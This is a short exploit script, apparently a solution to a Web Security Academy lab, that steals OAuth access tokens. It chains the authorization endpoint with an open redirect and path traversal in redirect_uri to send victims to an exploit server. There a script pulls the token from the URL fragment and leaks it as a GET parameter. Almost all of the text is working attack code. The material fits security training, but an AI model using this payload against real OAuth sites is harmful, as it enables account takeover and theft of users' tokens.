*/ three links in the script are:
1st - authentication initialization
2nd - redirecting using blog's next path feature + path traversl
3rd - link to the exploit location

this leaks the token via fragment in the URI
when victims returns back to the malicious link (window.location.hash = True)
the script extracts the hash from the URI and sends it as a GET parameter to finalize the leak
/*

<script>
if (!document.location.hash) {
window.location = 'https://oauth-ac091f821fd0471ac088e8a2022f0013.web-security-academy.net/auth?client_id=a388sx5v6gxa1pdywvj38&redirect_uri=https://acdd1f361f3c4746c0d4e8ba002d00b2.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-ac991fef1f8f4782c0c3e884011800de.web-security-academy.net/exploit&response_type=token&nonce=373179658&scope=openid%20profile%20email'
} else {
window.location = '/?'+document.location.hash.substr(1)
}
</scr